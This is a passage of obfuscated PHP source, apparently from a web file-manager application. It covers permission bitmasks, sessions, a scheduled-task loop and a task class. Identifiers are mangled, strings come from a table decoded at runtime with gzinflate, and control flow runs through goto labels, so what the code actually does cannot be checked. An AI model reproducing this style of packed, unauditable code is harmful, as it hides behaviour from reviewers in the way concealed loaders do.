$™ôğÏøÕ[201] => 1); $£ÂÌ“ş“ = Model($™ôğÏøÕ[898])->where($Ê•§šÔ)->sum($™ôğÏøÕ[90]); $Ê•§šÔ[$™ôğÏøÕ[201]] = 2; $’»Æ¢òó = Model($™ôğÏøÕ[898])->where($Ê•§šÔ)->sum($™ôğÏøÕ[90]); return array($™ôğÏøÕ[836] => $ğúì‚ñ[$™ôğÏøÕ[90]], $™ôğÏøÕ[1902] => $ğúì‚ñ[$™ôğÏøÕ[1902]], $™ôğÏøÕ[1903] => (int) $£ÂÌ“ş“, $™ôğÏøÕ[1904] => (int) $’»Æ¢òó); } private function sourceSize() { $ğ°éÎ¨» =& $_SERVER[Ò°Ì”İ•]; $úû¨Õú— = Model($ğ°éÎ¨»[898])->where(array($ğ°éÎ¨»[497] => 0))->sum($ğ°éÎ¨»[90]); $Å‹°â… = Model($ğ°éÎ¨»[556])->sum($ğ°éÎ¨»[90]); if ($Å‹°â… > $úû¨Õú—) { $Å‹°â… = $úû¨Õú—; } return array($ğ°éÎ¨»[90] => (int) $úû¨Õú—, $ğ°éÎ¨»[1902] => (int) $Å‹°â…); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ÄšÓ·Ş… =& $_SERVER[Ò°Ì”İ•]; $å¼“ıÓş = array(array($ÄšÓ·Ş…[506] => LNG($ÄšÓ·Ş…[1970]), $ÄšÓ·Ş…[1971] => $ÄšÓ·Ş…[1972], $ÄšÓ·Ş…[1973] => 1, $ÄšÓ·Ş…[1974] => 1, $ÄšÓ·Ş…[1975] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÄšÓ·Ş…[506] => LNG($ÄšÓ·Ş…[1976]), $ÄšÓ·Ş…[1971] => $ÄšÓ·Ş…[1977], $ÄšÓ·Ş…[1973] => 2, $ÄšÓ·Ş…[1974] => 1, $ÄšÓ·Ş…[1975] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÄšÓ·Ş…[506] => LNG($ÄšÓ·Ş…[1978]), $ÄšÓ·Ş…[1971] => $ÄšÓ·Ş…[1979], $ÄšÓ·Ş…[1973] => 3, $ÄšÓ·Ş…[1974] => 1, $ÄšÓ·Ş…[1975] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÄšÓ·Ş…[506] => LNG($ÄšÓ·Ş…[1980]), $ÄšÓ·Ş…[1971] => $ÄšÓ·Ş…[1981], $ÄšÓ·Ş…[1973] => 4, $ÄšÓ·Ş…[1974] => 1, $ÄšÓ·Ş…[1975] => self::AUTH_SHOW | self::AUTH_VIEW), array($ÄšÓ·Ş…[506] => LNG($ÄšÓ·Ş…[1982]), $ÄšÓ·Ş…[1971] => $ÄšÓ·Ş…[1983], $ÄšÓ·Ş…[1973] => 5, $ÄšÓ·Ş…[1974] => 1, $ÄšÓ·Ş…[1975] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ÄšÓ·Ş…[506] => LNG($ÄšÓ·Ş…[1984]), $ÄšÓ·Ş…[1971] => $ÄšÓ·Ş…[1985], $ÄšÓ·Ş…[1973] => 6, $ÄšÓ·Ş…[1974] => 1, $ÄšÓ·Ş…[1975] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ÄšÓ·Ş…[506] => LNG($ÄšÓ·Ş…[1986]), $ÄšÓ·Ş…[1971] => $ÄšÓ·Ş…[1987], $ÄšÓ·Ş…[1973] => 7, $ÄšÓ·Ş…[1974] => 1, $ÄšÓ·Ş…[1975] => 0)); return $å¼“ıÓş; } public static function authCheck($—õ®š­, $øâáí’) { $°Şà‚…½ =& $_SERVER[Ò°Ì”İ•]; $—õ®š­ = intval($—õ®š­); if (KodUser::isRoot() && $GLOBALS[$°Şà‚…½[6]][$°Şà‚…½[1988]]) { return !0; } if ($—õ®š­ <= 0) { return !1; } if (($—õ®š­ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($—õ®š­ & $øâáí’); } public static function authCheckShow($©ö¥å¸Í) { return self::authCheck($©ö¥å¸Í, self::AUTH_SHOW); } public static function authCheckView($Àä¤şÙ) { return self::authCheck($Àä¤şÙ, self::AUTH_VIEW); } public static function authCheckDownload($®˜¨¡ô) { return self::authCheck($®˜¨¡ô, self::AUTH_DOWNLOAD); } public static function authCheckUpload($õ÷ª®ù×) { return self::authCheck($õ÷ª®ù×, self::AUTH_UPLOAD); } public static function authCheckEdit($ÊìÚ÷ÄØ) { return self::authCheck($ÊìÚ÷ÄØ, self::AUTH_EDIT); } public static function authCheckRemove($üªÛ­üÖ) { return self::authCheck($üªÛ­üÖ, self::AUTH_REMOVE); } public static function authCheckShare($ˆ‘×) { return self::authCheck($ˆ‘×, self::AUTH_SHARE); } public static function authCheckComment($¨œ¥şÌ¸) { return self::authCheck($¨œ¥şÌ¸, self::AUTH_COMMENT); } public static function authCheckEvent($·ƒ Şµì) { return self::authCheck($·ƒ Şµì, self::AUTH_EVENT); } public static function authCheckRoot($Òóõ³ı) { return self::authCheck($Òóõ³ı, self::AUTH_ROOT); } public static function authCheckAction($°Ëò«, $úÖş£Ò) { $ïò‘…Ô‰ =& $_SERVER[Ò°Ì”İ•]; $‘Èš†ü‡ = array($ïò‘…Ô‰[1989] => self::AUTH_VIEW, $ïò‘…Ô‰[1275] => self::AUTH_DOWNLOAD, $ïò‘…Ô‰[121] => self::AUTH_UPLOAD, $ïò‘…Ô‰[1938] => self::AUTH_EDIT, $ïò‘…Ô‰[1937] => self::AUTH_REMOVE, $ïò‘…Ô‰[1948] => self::AUTH_SHARE, $ïò‘…Ô‰[441] => self::AUTH_COMMENT, $ïò‘…Ô‰[1755] => self::AUTH_EVENT, $ïò‘…Ô‰[1990] => self::AUTH_ROOT); if (!isset($‘Èš†ü‡[$úÖş£Ò])) { return; } $ì…’Ò’„ = $‘Èš†ü‡[$úÖş£Ò]; $°Ëò« = intval($°Ëò«); if ($°Ëò« <= 0) { return !1; } if (($°Ëò« & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($°Ëò« & $ì…’Ò’„); } public static function authDisable($Á­ìØïİ, $š×ƒš‰Í) { if (intval($Á­ìØïİ) <= 0) { return 0; } return intval($Á­ìØïİ) & ~$š×ƒš‰Í; } public $optionType = "\x53\x79\x73\164\145\x6d\x2e\x73\x6f\x75\162\x63\x65\101\x75\164\x68\x4c\151\163\x74"; public $field = array("\156\141\155\x65", "\x61\x75\164\150", "\154\x61\x62\x65\154", "\144\151\x73\160\154\141\171", "\x73\171\163\164\x65\x6d", "\163\157\162\164"); public function initData() { $îÕñÙ¨ = $this->authDefault(); foreach ($îÕñÙ¨ as $˜€Éèˆ£) { $this->add($˜€Éèˆ£); } } public function findAuth($‹šá”ª…, $·ÔİÑì) { $¿àÈ­«  =& $_SERVER[Ò°Ì”İ•]; $å½›íäª = parent::listData(); foreach ($å½›íäª as $šÑó´œ) { $¢ùÍ·‘ˆ = intval($šÑó´œ[$¿àÈ­« [499]]); if ($¢ùÍ·‘ˆ <= 0 || $šÑó´œ[$¿àÈ­« [1991]] == 0) { continue; } if (($¢ùÍ·‘ˆ & $‹šá”ª…) != $‹šá”ª…) { continue; } if (($¢ùÍ·‘ˆ & $·ÔİÑì) != 0) { continue; } return $šÑó´œ[$¿àÈ­« [487]]; } return !1; } public function findAuthMax($Š·ÔüâŞ, $³¾‹Ò®ˆ) { $…“ßÄµŠ =& $_SERVER[Ò°Ì”İ•]; $¹»˜´ôÖ = !1; $æøÌØÜé = parent::listData(); foreach ($æøÌØÜé as $å¸ñ¦·å) { $Œ›º›½ = intval($å¸ñ¦·å[$…“ßÄµŠ[499]]); if ($Œ›º›½ <= 0 || $å¸ñ¦·å[$…“ßÄµŠ[1991]] == 0) { continue; } if (($Œ›º›½ & $Š·ÔüâŞ) != $Š·ÔüâŞ) { continue; } if (($Œ›º›½ & $³¾‹Ò®ˆ) != 0) { continue; } if (!$¹»˜´ôÖ) { $¹»˜´ôÖ = $å¸ñ¦·å; continue; } if (intval($¹»˜´ôÖ[$…“ßÄµŠ[499]]) < $Œ›º›½) { $¹»˜´ôÖ = $å¸ñ¦·å; } } return $¹»˜´ôÖ ? $¹»˜´ôÖ[$…“ßÄµŠ[487]] : !1; } public function findAuthReadOnly() { $“«‘¸Úé = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $šÏ¯Í¨ˆ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($“«‘¸Úé, $šÏ¯Í¨ˆ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ˆ”˜şí¤ =& $_SERVER[Ò°Ì”İ•]; $õø¨¦¢Ø = parent::listData(); $öØ¤‚ŒĞ = !1; foreach ($õø¨¦¢Ø as $Ç˜ñ“ò) { if ($Ç˜ñ“ò[$ˆ”˜şí¤[499]] <= 0 || $Ç˜ñ“ò[$ˆ”˜şí¤[1991]] == $ˆ”˜şí¤[241]) { continue; } if (!$öØ¤‚ŒĞ) { $öØ¤‚ŒĞ = $Ç˜ñ“ò; continue; } if ($öØ¤‚ŒĞ[$ˆ”˜şí¤[499]] > $Ç˜ñ“ò[$ˆ”˜şí¤[499]]) { $öØ¤‚ŒĞ = $Ç˜ñ“ò; } } return $öØ¤‚ŒĞ ? $öØ¤‚ŒĞ[$ˆ”˜şí¤[487]] : $ˆ”˜şí¤[12]; } public function listData($û›±¬âÃ = false, $«÷Àğ³õ = "\x73\157\x72\x74", $ÒÊÇıù = false) { return parent::listData($û›±¬âÃ, $«÷Àğ³õ, $ÒÊÇıù); } public function update($É«ŸÃ„î, $«é´ÚŸÜ) { $¿‹Ÿï³˜ =& $_SERVER[Ò°Ì”İ•]; $ˆ½€ê‘Æ = parent::listData($É«ŸÃ„î); $”—Û®ø³ = $this->findByName($«é´ÚŸÜ[$¿‹Ÿï³˜[32]]); if (!$ˆ½€ê‘Æ || $”—Û®ø³ && $”—Û®ø³[$¿‹Ÿï³˜[487]] != $ˆ½€ê‘Æ[$¿‹Ÿï³˜[487]]) { return !1; } $this->filterAuth($«é´ÚŸÜ[$¿‹Ÿï³˜[499]]); return parent::update($É«ŸÃ„î, $«é´ÚŸÜ); } public function remove($ƒú¥Ú¹) { $¿¹Â¦ = parent::listData($ƒú¥Ú¹); if (!$¿¹Â¦ || $¿¹Â¦[$_SERVER[Ò°Ì”İ•][202]]) { return !1; } return parent::remove($ƒú¥Ú¹); } public function add($Èê¤ÆïÛ = array()) { $ÙêÜæ¨” =& $_SERVER[Ò°Ì”İ•]; if ($this->findByName($Èê¤ÆïÛ[$ÙêÜæ¨”[32]])) { return !1; } $‚ £±ÜŞ = array($ÙêÜæ¨”[32] => $ÙêÜæ¨”[12], $ÙêÜæ¨”[499] => 1, $ÙêÜæ¨”[1992] => $ÙêÜæ¨”[1979], $ÙêÜæ¨”[1991] => 1, $ÙêÜæ¨”[202] => 0, $ÙêÜæ¨”[1993] => 0); $Èê¤ÆïÛ = array_merge($‚ £±ÜŞ, $Èê¤ÆïÛ); $Èê¤ÆïÛ[$ÙêÜæ¨”[1993]] = $this->getSort(); $this->filterAuth($Èê¤ÆïÛ[$ÙêÜæ¨”[499]]); return parent::insert($Èê¤ÆïÛ); } private function getSort() { $Ü£ÙıÀ© =& $_SERVER[Ò°Ì”İ•]; $»ÃÂ¨«¡ = parent::listData(); $‚‚‰·Â = array_to_keyvalue($»ÃÂ¨«¡, $Ü£ÙıÀ©[12], $Ü£ÙıÀ©[1993]); return empty($‚‚‰·Â) ? 0 : max($‚‚‰·Â) + 1; } private function filterAuth(&$ŒÙ÷‡ü”) { if (!$ŒÙ÷‡ü”) { return; } $ÂËë†›º = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ù¸µàˆÖ = array(); foreach ($ÂËë†›º as $¦ê€êëÒ) { if ($ŒÙ÷‡ü” & $¦ê€êëÒ) { $ù¸µàˆÖ[] = $¦ê€êëÒ; } } if (in_array(self::AUTH_ROOT, $ù¸µàˆÖ)) { $ŒÙ÷‡ü” = array_sum($ÂËë†›º); return; } $ú§ø‚¶ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ù¸µàˆÖ as $¦ê€êëÒ) { if (isset($ú§ø‚¶[$¦ê€êëÒ])) { $ù¸µàˆÖ = array_merge($ù¸µàˆÖ, $ú§ø‚¶[$¦ê€êëÒ]); } } $ù¸µàˆÖ[] = self::AUTH_SHOW; $ŒÙ÷‡ü” = array_sum(array_unique($ù¸µàˆÖ)); } public function sort($Ò°é‡ú, $û¶† ³®) { return parent::update($Ò°é‡ú, $û¶† ³®); } } goto A‹ùÑÊ±¥; fŠßÔŒ¢Ş±: $gupomtznqx = $_SERVER[Ò°Ì”İ•][694]; $_SERVER[¦ù÷êöÏ] = explode($_SERVER[Ò°Ì”İ•][695], gzinflate(substr($_SERVER[Ò°Ì”İ•][696], 10, -8))); $vdwlsineca = $_SERVER[Ò°Ì”İ•][697]; goto A²ºšŸ¶¹×; C­„ÁàÂ†Ô: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $œÅª‚äæ =& $_SERVER[Ò°Ì”İ•]; static $ç¼Ö ‚ë = false; if ($ç¼Ö ‚ë) { return $ç¼Ö ‚ë; } $«ªğ¢ë— = $GLOBALS[$œÅª‚äæ[6]][$œÅª‚äæ[436]]; self::$sessionTime = $«ªğ¢ë—[$œÅª‚äæ[1713]]; $¿¾À¾Äƒ = isset($GLOBALS[$œÅª‚äæ[1714]]) ? $GLOBALS[$œÅª‚äæ[1714]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¿¾À¾Äƒ)) { self::$sessionSign = Cookie::get($¿¾À¾Äƒ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($¿¾À¾Äƒ, self::$sessionSign, self::$sessionTime); $ß™ŸÅıì = $«ªğ¢ë—[$œÅª‚äæ[1715]]; $Ì¬™ı¯± = $«ªğ¢ë—[$ß™ŸÅıì]; $ª÷éÓÚ = $«ªğ¢ë—[$œÅª‚äæ[901]]; switch ($ß™ŸÅıì) { case $œÅª‚äæ[21]: self::$handle = Model($œÅª‚äæ[902]); break; case $œÅª‚äæ[903]: self::$handle = new CacheRedis($Ì¬™ı¯±, $ª÷éÓÚ); break; case $œÅª‚äæ[904]: self::$handle = new CacheMemcached($Ì¬™ı¯±, $ª÷éÓÚ); break; case $œÅª‚äæ[243]: $Ì¬™ı¯±[$œÅª‚äæ[98]] = $Ì¬™ı¯±[$œÅª‚äæ[98]] . $œÅª‚äæ[1716]; self::$handle = new CacheFile($Ì¬™ı¯±, $ª÷éÓÚ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ç¼Ö ‚ë = new self(); return $ç¼Ö ‚ë; } public static function getBySign($šµØ×¦ú) { $¶Ğ„Ë‹ = self::$handle->get($šµØ×¦ú); $¶Ğ„Ë‹ = unserialize($¶Ğ„Ë‹); return is_array($¶Ğ„Ë‹) ? $¶Ğ„Ë‹ : array(); } public static function setBySign($¡öÙ¶ƒÚ, $î¸íö„Æ) { CacheLock::lock($¡öÙ¶ƒÚ); self::$handle->set($¡öÙ¶ƒÚ, serialize($î¸íö„Æ), self::$sessionTime); CacheLock::unlock($¡öÙ¶ƒÚ); } public static function sign($ßİ”İËë = false) { if ($ßİ”İËë) { self::$sessionSign = $ßİ”İËë; } self::init(); return self::$sessionSign; } public static function set($àëÎßÌù, $ËµÃÛƒ = false) { self::init(); if (is_array($àëÎßÌù)) { foreach ($àëÎßÌù as $¿ä±Ù¶â => $áë¡Ä¨İ) { array_set_value(self::$data, $¿ä±Ù¶â, $áë¡Ä¨İ); } } else { array_set_value(self::$data, $àëÎßÌù, $ËµÃÛƒ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($¿ªœ±ø = false) { self::init(); if (!$¿ªœ±ø) { return self::$data; } return array_get_value(self::$data, $¿ªœ±ø); } public static function remove($çµ‹íıŠ) { self::init(); unset(self::$data[$çµ‹íıŠ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ò°Ì”İ•][907])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $÷­âöë =& $_SERVER[Ò°Ì”İ•]; if (self::valueGet($÷­âöë[823]) != $÷­âöë[102]) { return; } if (self::valueGet($÷­âöë[1717]) == $÷­âöë[102]) { $Ğ½ò› = self::valueGet($÷­âöë[1718]); if (time() - $Ğ½ò› > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($÷­âöë[1717], $÷­âöë[102]); self::log($÷­âöë[1719] . ACTION . $÷­âöë[1720]); Hook::bind($÷­âöë[1721], $÷­âöë[1722]); $í÷ÏšÊŸ = 0; while (!0) { self::cacheClear(); if (self::valueGet($÷­âöë[823]) != $÷­âöë[102]) { self::valueSet($÷­âöë[1717], $÷­âöë[241]); self::log($÷­âöë[1723]); die; } $¹§€Ğ¾ = time(); if ($¹§€Ğ¾ - $í÷ÏšÊŸ >= 60) { self::valueSet(array($÷­âöë[1717] => $÷­âöë[102], $÷­âöë[1718] => $¹§€Ğ¾)); $í÷ÏšÊŸ = $¹§€Ğ¾; } if (!file_exists(USER_SYSTEM . $÷­âöë[1724])) { self::valueSet(array($÷­âöë[1717] => $÷­âöë[241], $÷­âöë[823] => $÷­âöë[241])); self::log($÷­âöë[1725]); die; } $ıÂ½Ìí¯ = file_get_contents(BASIC_PATH . $÷­âöë[1726]); $®œ¤Ù¢– = KOD_VERSION . $÷­âöë[10] . KOD_VERSION_BUILD; $êû¤–íã = match_text($ıÂ½Ìí¯, $÷­âöë[1727]) . $÷­âöë[10] . match_text($ıÂ½Ìí¯, $÷­âöë[1728]); if ($êû¤–íã != $®œ¤Ù¢–) { self::restart(); self::log("\163\x74\157\160\x65\x64\x2e\133\166\x65\x72\x73\x69\157\x6e\40\x75\x70\144\x61\x74\145\73{$versionNow}\x20\x3d\x3e\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ˆÏåìÜ˜ =& $_SERVER[Ò°Ì”İ•]; http_close(); $GLOBALS[$ˆÏåìÜ˜[1729]] = 1; $_SERVER[$ˆÏåìÜ˜[1730]] = $ˆÏåìÜ˜[1731]; $_COOKIE = array(); $GLOBALS[$ˆÏåìÜ˜[1732]] = 1; $GLOBALS[$ˆÏåìÜ˜[1733]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $¥š’¤÷± =& $_SERVER[Ò°Ì”İ•]; http_close(); self::valueSet($¥š’¤÷±[823], $¥š’¤÷±[241]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¥š’¤÷±[1717] => $¥š’¤÷±[241], $¥š’¤÷±[823] => $¥š’¤÷±[102])); self::log($¥š’¤÷±[1734]); } public static function taskSwitch() { $Í¾ø†Í˜ =& $_SERVER[Ò°Ì”İ•]; $Í€º¨Êà = self::valueGet($Í¾ø†Í˜[823]) == $Í¾ø†Í˜[102] ? $Í¾ø†Í˜[241] : $Í¾ø†Í˜[102]; self::valueSet($Í¾ø†Í˜[823], $Í€º¨Êà); } public static function shutdownEvent() { $ÈãÅİ³ğ =& $_SERVER[Ò°Ì”İ•]; self::valueSet($ÈãÅİ³ğ[1717], $ÈãÅİ³ğ[241]); self::log($ÈãÅİ³ğ[1735]); } public static function config($ÏóÅš£š, $üŠ¹­ûú) { self::valueSet($_SERVER[Ò°Ì”İ•][823], $ÏóÅš£š); } private static function taskRunAll() { $Î§æ¯ÙÅ =& $_SERVER[Ò°Ì”İ•]; $Ÿ¥­ÌôĞ = timeFloat(); $ç—”§  = Model($Î§æ¯ÙÅ[1736])->listData(); $ƒ–Ã÷„ = count($ç—”§ ); for ($Ÿ®é×ü = 0; $Ÿ®é×ü < $ƒ–Ã÷„; $Ÿ®é×ü++) { $ô“—½² = $ç—”§ [$Ÿ®é×ü]; if (!$ô“—½²[$Î§æ¯ÙÅ[487]] || $ô“—½²[$Î§æ¯ÙÅ[1737]] != $Î§æ¯ÙÅ[102]) { continue; } if (!self::taskTimeCheck($ô“—½²)) { continue; } self::taskRun($ô“—½²); } Hook::trigger($Î§æ¯ÙÅ[1738]); self::taskQueueRun($Ÿ¥­ÌôĞ); } private static function taskQueueRun($…ĞÑñ€Ã) { $â¹çã“ = 10; while (!0) { $†Å¹›¶È = TaskQueue::run(); if ($†Å¹›¶È === !1) { break; } if (timeFloat() - $…ĞÑñ€Ã >= $â¹çã“) { break; } } } private static function taskTimeCheck($ğÓ Ñ…Ÿ) { $×”½óˆ =& $_SERVER[Ò°Ì”İ•]; $¢àÊÇİÎ = json_decode($ğÓ Ñ…Ÿ[$×”½óˆ[217]], !0); $çáÖ£ˆƒ = intval($ğÓ Ñ…Ÿ[$×”½óˆ[1718]]); $òŸªÇÃ» = strtotime($×”½óˆ[1739] . $¢àÊÇİÎ[$×”½óˆ[1740]] . $×”½óˆ[1741]) - strtotime($×”½óˆ[1742]); $ÎÍÒÌÈ = time() - strtotime(date($×”½óˆ[1743]) . $×”½óˆ[1744]); $½Óé„˜ó = $ÎÍÒÌÈ >= $òŸªÇÃ» && $ÎÍÒÌÈ <= $òŸªÇÃ» + 3600; switch ($¢àÊÇİÎ[$×”½óˆ[33]]) { case $×”½óˆ[1745]: if (time() - $çáÖ£ˆƒ < 3600 * 24 * 30) { return !1; } if ($¢àÊÇİÎ[$×”½óˆ[1745]] == date($×”½óˆ[1746]) && $½Óé„˜ó) { return !0; } break; case $×”½óˆ[1747]: if (time() - $çáÖ£ˆƒ < 3600 * 24 * 7) { return !1; } $†ÍÇÊÉ = date($×”½óˆ[1748]) == 0 ? 7 : date($×”½óˆ[1748]); if ($¢àÊÇİÎ[$×”½óˆ[1747]] == $†ÍÇÊÉ && $½Óé„˜ó) { return !0; } break; case $×”½óˆ[1740]: if (time() - $çáÖ£ˆƒ < 3600 * 24) { return !1; } if ($½Óé„˜ó) { return !0; } break; case $×”½óˆ[1749]: if (time() - $çáÖ£ˆƒ >= floatval($¢àÊÇİÎ[$×”½óˆ[1749]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Š»’¾µó =& $_SERVER[Ò°Ì”İ•]; static $‡†¸ãºœ = 0; $ôé£¬áì = 300; if (!$‡†¸ãºœ) { $‡†¸ãºœ = time(); } if (time() - $‡†¸ãºœ < $ôé£¬áì) { return; } $‡†¸ãºœ = time(); $Ã«Å÷…û = Model($Š»’¾µó[589])->db($Š»’¾µó[12]); if ($Ã«Å÷…û) { $Ã«Å÷…û->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Š»’¾µó[1750], $Š»’¾µó[1751]); die; } } public static function taskRun($«éòƒõ) { $‰‹Ä¹ÔÉ =& $_SERVER[Ò°Ì”İ•]; self::log($‰‹Ä¹ÔÉ[1752] . $«éòƒõ[$‰‹Ä¹ÔÉ[487]] . $‰‹Ä¹ÔÉ[1753] . $«éòƒõ[$‰‹Ä¹ÔÉ[32]] . $‰‹Ä¹ÔÉ[1754] . $«éòƒõ[$‰‹Ä¹ÔÉ[1755]]); Model($‰‹Ä¹ÔÉ[1736])->run($«éòƒõ[$‰‹Ä¹ÔÉ[487]]); $¶ë‹±¥Š = timeFloat(); $ï»ëşÜÈ = $‰‹Ä¹ÔÉ[12]; switch ($«éòƒõ[$‰‹Ä¹ÔÉ[33]]) { case $‰‹Ä¹ÔÉ[394]: $ÕïüøÌ = url_request($«éòƒõ[$‰‹Ä¹ÔÉ[1755]], $‰‹Ä¹ÔÉ[1492], !1, !1, !1, !1, 10); if ($ÕïüøÌ[$‰‹Ä¹ÔÉ[823]]) { $ï»ëşÜÈ = strlen($ÕïüøÌ[$‰‹Ä¹ÔÉ[1283]]); } break; case $‰‹Ä¹ÔÉ[1756]: $ï»ëşÜÈ = Hook::apply($«éòƒõ[$‰‹Ä¹ÔÉ[1755]]); default: break; } Model($‰‹Ä¹ÔÉ[1757])->add(array($‰‹Ä¹ÔÉ[1758] => $‰‹Ä¹ÔÉ[12], $‰‹Ä¹ÔÉ[1759] => $‰‹Ä¹ÔÉ[241], $‰‹Ä¹ÔÉ[33] => $‰‹Ä¹ÔÉ[1760] . $«éòƒõ[$‰‹Ä¹ÔÉ[487]], $‰‹Ä¹ÔÉ[1761] => json_encode(array($‰‹Ä¹ÔÉ[32] => $«éòƒõ[$‰‹Ä¹ÔÉ[32]], $‰‹Ä¹ÔÉ[1762] => timeFloat() - $¶ë‹±¥Š, $‰‹Ä¹ÔÉ[380] => $ï»ëşÜÈ)))); $í‚Äë¢î = $ï»ëşÜÈ ? $‰‹Ä¹ÔÉ[1763] . $ï»ëşÜÈ : $‰‹Ä¹ÔÉ[12]; self::log($‰‹Ä¹ÔÉ[1764] . $«éòƒõ[$‰‹Ä¹ÔÉ[487]] . $‰‹Ä¹ÔÉ[189] . $í‚Äë¢î); return !0; } public static function valueGet($¶öİ¦€È) { $ÉŸºñÚÉ =& $_SERVER[Ò°Ì”İ•]; $ÈÖ¢ŞëØ = $ÉŸºñÚÉ[1765]; $òÑ¶æÇ˜ = Model($ÉŸºñÚÉ[520])->get($¶öİ¦€È, $ÈÖ¢ŞëØ); if (is_null($òÑ¶æÇ˜)) { Model($ÉŸºñÚÉ[520])->set($ÉŸºñÚÉ[823], $ÉŸºñÚÉ[102], $ÈÖ¢ŞëØ); Model($ÉŸºñÚÉ[520])->set($ÉŸºñÚÉ[1717], $ÉŸºñÚÉ[241], $ÈÖ¢ŞëØ); $òÑ¶æÇ˜ = Model($ÉŸºñÚÉ[520])->get($¶öİ¦€È, $ÈÖ¢ŞëØ); } return $òÑ¶æÇ˜; } private static function valueSet($‰Çšã™®, $á×Üåº¡ = false) { $óåÀª½± =& $_SERVER[Ò°Ì”İ•]; $ò½ñ±¯ı = $óåÀª½±[1766]; CacheLock::lock($ò½ñ±¯ı); $ÚÂÀ³à‚ = Model($óåÀª½±[520])->set($‰Çšã™®, $á×Üåº¡, $óåÀª½±[1765]); CacheLock::unlock($ò½ñ±¯ı); return $ÚÂÀ³à‚; } protected static function log($ÏŞïÂ‡) { write_log($ÏŞïÂ‡, $_SERVER[Ò°Ì”İ•][1751]); } private static function cacheClear() { $¾şÅõÙü =& $_SERVER[Ò°Ì”İ•]; Cache::clearMemory(Model($¾şÅõÙü[520])->cacheKey($¾şÅõÙü[1765])); Cache::clearMemory(Model($¾şÅõÙü[520])->cacheKey($¾şÅõÙü[1767])); Model($¾şÅõÙü[1736])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\162\x75\156\x6e\x69\x6e\147"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¤¢Õ†Ü™, $­ØµãÀà = '', $í×ã£ÇÌ = 0, $éŸé…ˆ² = '') { $Ç¢ƒé÷€ =& $_SERVER[Ò°Ì”İ•]; if (self::get($¤¢Õ†Ü™)) { return; } $this->task = array($Ç¢ƒé÷€[487] => $¤¢Õ†Ü™, $Ç¢ƒé÷€[1768] => USER_ID, $Ç¢ƒé÷€[1656] => $éŸé…ˆ², $Ç¢ƒé÷€[538] => $Ç¢ƒé÷€[12], $Ç¢ƒé÷€[33] => $­ØµãÀà, $Ç¢ƒé÷€[1138] => $Ç¢ƒé÷€[12], $Ç¢ƒé÷€[1136] => $í×ã£ÇÌ, $Ç¢ƒé÷€[1769] => 0, $Ç¢ƒé÷€[1770] => 0, $Ç¢ƒé÷€[1771] => 0, $Ç¢ƒé÷€[1772] => timeFloat(), $Ç¢ƒé÷€[1773] => 0, $Ç¢ƒé÷€[1774] => 0, $Ç¢ƒé÷€[1775] => 0, $Ç¢ƒé÷€[1776] => 0, 